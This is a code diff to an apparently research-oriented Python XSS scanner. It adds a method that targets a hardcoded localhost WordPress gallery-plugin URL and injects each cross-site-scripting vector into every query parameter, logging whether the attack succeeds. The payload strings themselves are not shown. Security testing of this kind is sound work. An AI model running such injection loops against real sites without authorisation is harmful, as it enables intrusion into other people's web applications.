@@ -9,6 +9,7 @@ from PyQt5.QtWidgets import QApplication
 from attack.xss import XSSAttacker, AttackResult
 from attack.xxxattacks import XSSVectors
 from core.jaek import Jaek
+from models.url import Url
 from models.utils import CrawlSpeed
 from network.network import NetWorkAccessManager
 from utils.domainhandler import DomainHandler
@@ -36,8 +37,26 @@ class Attacker(Jaek):
             go_on = self.initial_login()
             if not go_on:
                 raise LoginFailed("Initial login failed...")
-        self.attack_all_get_forms()
-        self.attack_all_urls()
+        #self.attack_all_get_forms()
+        #self.attack_all_urls()
+        self.attack_single_url(None)
+
+
+    def attack_single_url(self, url):
+        url = Url("http://localhost:8080/wp-content/plugins/tidio-gallery/popup-insert-help.php?galleryId=t47sx79npgz01tywyeo3wwuuxz03u7vh")
+        for parameter_to_attack in url.parameters:
+            for vector in self._xss_vector.attack_vectors:
+                attack_url = url.scheme + "://" + url.domain + url.path + "?"
+                random_val = self._xss_vector.random_string_generator(12)
+                for other_parameters in url.parameters:
+                    if parameter_to_attack == other_parameters:
+                        attack_url += other_parameters + "=" + vector.replace("XSS", random_val) + "&"
+                    else:
+                        attack_url += other_parameters + "=" + url.parameters[other_parameters][0] + "&"
+                attack_url = attack_url[:-1] # Removing the last "&
+                logging.debug("Attack with: {}".format(attack_url))
+                result, response_code = self._xss.attack(attack_url, random_val)
+                logging.debug("Result: {}".format(result))
 
 
     def attack_all_urls(self):
